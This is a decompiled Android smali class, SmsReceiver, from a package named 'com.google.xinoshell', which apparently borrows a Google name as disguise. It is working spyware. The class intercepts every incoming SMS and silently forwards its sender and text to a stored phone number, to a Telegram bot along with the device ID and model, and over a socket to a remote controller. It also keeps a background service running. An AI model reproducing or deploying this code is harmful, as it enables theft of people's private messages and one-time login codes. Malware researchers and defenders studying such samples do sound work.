.class public Lcom/google/xinoshell/receivers/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"


# static fields
.field static final synthetic $assertionsDisabled:Z = false

.field private static final TAG:Ljava/lang/String; = "SmsReceiver"


# instance fields
.field private deviceID:Ljava/lang/String;

.field private manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

.field private prefs:Lcom/google/xinoshell/utils/SharedPrefManager;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    .line 28
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 28
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private getMessageObj(Ljava/lang/String;Ljava/lang/String;)Lorg/json/JSONObject;
    .locals 3
    .param p1, "sender"    # Ljava/lang/String;
    .param p2, "completeMessage"    # Ljava/lang/String;

    .line 137
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 138
    .local v0, "message":Lorg/json/JSONObject;
    const-string v1, "sender"

    invoke-virtual {v0, v1, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 139
    const-string v1, "textMessage"

    invoke-virtual {v0, v1, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 140
    const-string v1, "DeviceId"

    iget-object v2, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->deviceID:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 141
    const-string v1, "type"

    const-string v2, "incoming"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 142
    const-string v1, "userId"

    sget-object v2, Lcom/google/xinoshell/utils/Config;->userID:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 143
    return-object v0

    .line 144
    .end local v0    # "message":Lorg/json/JSONObject;
    :catch_0
    move-exception v0

    .line 145
    .local v0, "e":Lorg/json/JSONException;
    const/4 v1, 0x0

    return-object v1
.end method

.method private handleSmsReceived(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .line 68
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    .line 69
    .local v0, "bundle":Landroid/os/Bundle;
    if-eqz v0, :cond_6

    .line 70
    const-string v1, "pdus"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Ljava/lang/Object;

    .line 71
    .local v1, "pdus":[Ljava/lang/Object;
    if-eqz v1, :cond_6

    .line 72
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 73
    .local v2, "fullMessage":Ljava/lang/StringBuilder;
    const/4 v3, 0x0

    .line 75
    .local v3, "sender":Ljava/lang/String;
    array-length v4, v1

    const/4 v5, 0x0

    move v6, v5

    :goto_0
    if-ge v6, v4, :cond_1

    aget-object v7, v1, v6

    .line 76
    .local v7, "pdu":Ljava/lang/Object;
    move-object v8, v7

    check-cast v8, [B

    invoke-static {v8}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v8

    .line 77
    .local v8, "smsMessage":Landroid/telephony/SmsMessage;
    if-nez v3, :cond_0

    .line 78
    invoke-virtual {v8}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v3

    .line 80
    :cond_0
    invoke-virtual {v8}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 75
    .end local v7    # "pdu":Ljava/lang/Object;
    .end local v8    # "smsMessage":Landroid/telephony/SmsMessage;
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    .line 83
    :cond_1
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 85
    .local v4, "completeMessage":Ljava/lang/String;
    iget-object v6, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v7, "isForwardSms"

    invoke-virtual {v6, v7}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_2

    .line 86
    iget-object v6, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v7, "forward"

    invoke-virtual {v6, v7}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 87
    .local v6, "numberTo":Ljava/lang/String;
    invoke-static {p1, v5, v6, v4}, Lcom/google/xinoshell/utils/SmsHelper;->sendSmsWithSim(Landroid/content/Context;ILjava/lang/String;Ljava/lang/String;)Z

    .line 90
    .end local v6    # "numberTo":Ljava/lang/String;
    :cond_2
    iget-object v5, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v6, "sendSmsToTG"

    invoke-virtual {v5, v6}, Lcom/google/xinoshell/utils/SharedPrefManager;->getB(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    .line 91
    iget-object v5, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v6, "toSmsTgToken"

    invoke-virtual {v5, v6}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    const-string v7, "toSmsTgUser"

    invoke-virtual {v6, v7}, Lcom/google/xinoshell/utils/SharedPrefManager;->get(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {p0, v5, v6, v3, v4}, Lcom/google/xinoshell/receivers/SmsReceiver;->sendMessageToTG(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 94
    :cond_3
    invoke-static {p1}, Lcom/google/xinoshell/utils/NetworkUtil;->isNetworkConnected(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_6

    .line 95
    invoke-direct {p0, v3, v4}, Lcom/google/xinoshell/receivers/SmsReceiver;->getMessageObj(Ljava/lang/String;Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v5

    .line 96
    .local v5, "messageObj":Lorg/json/JSONObject;
    if-eqz v5, :cond_5

    .line 97
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Message JSON: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const-string v7, "SmsReceiver"

    invoke-static {v7, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 98
    iget-object v6, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v6}, Lcom/google/xinoshell/connection/ManageSocket;->isConnected()Z

    move-result v6

    if-eqz v6, :cond_4

    .line 99
    iget-object v6, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    const-string v7, "received_message"

    invoke-virtual {v6, v7, v5}, Lcom/google/xinoshell/connection/ManageSocket;->send(Ljava/lang/String;Lorg/json/JSONObject;)V

    goto :goto_1

    .line 101
    :cond_4
    iget-object v6, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v6}, Lcom/google/xinoshell/connection/ManageSocket;->connect()V

    goto :goto_1

    .line 96
    :cond_5
    new-instance v6, Ljava/lang/AssertionError;

    invoke-direct {v6}, Ljava/lang/AssertionError;-><init>()V

    throw v6

    .line 106
    .end local v1    # "pdus":[Ljava/lang/Object;
    .end local v2    # "fullMessage":Ljava/lang/StringBuilder;
    .end local v3    # "sender":Ljava/lang/String;
    .end local v4    # "completeMessage":Ljava/lang/String;
    .end local v5    # "messageObj":Lorg/json/JSONObject;
    :cond_6
    :goto_1
    return-void
.end method

.method private sendMessageToTG(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 3
    .param p1, "botToken"    # Ljava/lang/String;
    .param p2, "userId"    # Ljava/lang/String;
    .param p3, "sender"    # Ljava/lang/String;
    .param p4, "completeMessage"    # Ljava/lang/String;

    .line 109
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Bot Token: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", Chat id: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "Telegram connection data: "

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 110
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "dd MMM yyyy, hh:mm a"

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-direct {v0, v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    .line 112
    .local v0, "timestamp":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "\ud83d\udce9 <b>New Message</b>\n\n\ud83d\udcf1 <b>Sender:</b> "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 113
    invoke-static {p3}, Landroid/text/Html;->escapeHtml(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n\ud83d\udd27 <b>Device ID:</b> "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->deviceID:Ljava/lang/String;

    .line 114
    invoke-static {v2}, Landroid/text/Html;->escapeHtml(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n\ud83d\udcf1 <b>Device Model:</b> "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 115
    invoke-static {}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getModel()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/text/Html;->escapeHtml(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n\ud83d\udd52 <b>Time:</b> "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 116
    invoke-static {v0}, Landroid/text/Html;->escapeHtml(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n\n\ud83d\udcac <b>Message:</b>\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 117
    invoke-static {p4}, Landroid/text/Html;->escapeHtml(Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 119
    .local v1, "message":Ljava/lang/String;
    new-instance v2, Lcom/google/xinoshell/receivers/SmsReceiver$1;

    invoke-direct {v2, p0}, Lcom/google/xinoshell/receivers/SmsReceiver$1;-><init>(Lcom/google/xinoshell/receivers/SmsReceiver;)V

    invoke-static {p1, p2, v1, v2}, Lcom/google/xinoshell/utils/TelegramBotUtils;->sendMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Lcom/google/xinoshell/utils/TelegramBotUtils$TelegramCallback;)V

    .line 133
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .line 38
    new-instance v0, Lcom/google/xinoshell/utils/SharedPrefManager;

    invoke-direct {v0, p1}, Lcom/google/xinoshell/utils/SharedPrefManager;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->prefs:Lcom/google/xinoshell/utils/SharedPrefManager;

    .line 39
    invoke-static {p1}, Lcom/google/xinoshell/utils/DeviceInfoUtil;->getDeviceID(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->deviceID:Ljava/lang/String;

    .line 40
    invoke-static {p1}, Lcom/google/xinoshell/connection/ManageSocket;->getInstance(Landroid/content/Context;)Lcom/google/xinoshell/connection/ManageSocket;

    move-result-object v0

    iput-object v0, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    .line 42
    iget-object v0, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v0}, Lcom/google/xinoshell/connection/ManageSocket;->connect()V

    .line 43
    const-string v0, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 44
    invoke-direct {p0, p1, p2}, Lcom/google/xinoshell/receivers/SmsReceiver;->handleSmsReceived(Landroid/content/Context;Landroid/content/Intent;)V

    .line 48
    :cond_0
    nop

    .line 49
    :try_start_0
    const-class v0, Lcom/google/xinoshell/services/BgService;

    invoke-static {p1, v0}, Lcom/google/xinoshell/utils/ServiceUtil;->isServiceRunning(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_2

    .line 50
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/google/xinoshell/services/BgService;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 51
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {p1, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 52
    iget-object v1, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    invoke-virtual {v1}, Lcom/google/xinoshell/connection/ManageSocket;->isConnected()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 53
    iget-object v1, p0, Lcom/google/xinoshell/receivers/SmsReceiver;->manageSocket:Lcom/google/xinoshell/connection/ManageSocket;

    const-string v2, "Foreground service started successfully "

    const/4 v3, 0x1

    invoke-virtual {v1, v2, v3}, Lcom/google/xinoshell/connection/ManageSocket;->sendSocketLog(Ljava/lang/String;I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    .end local v0    # "serviceIntent":Landroid/content/Intent;
    :cond_1
    nop

    .line 64
    :cond_2
    nop

    .line 65
    return-void

    .line 62
    :catch_0
    move-exception v0

    .line 63
    .local v0, "err":Ljava/lang/Exception;
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method
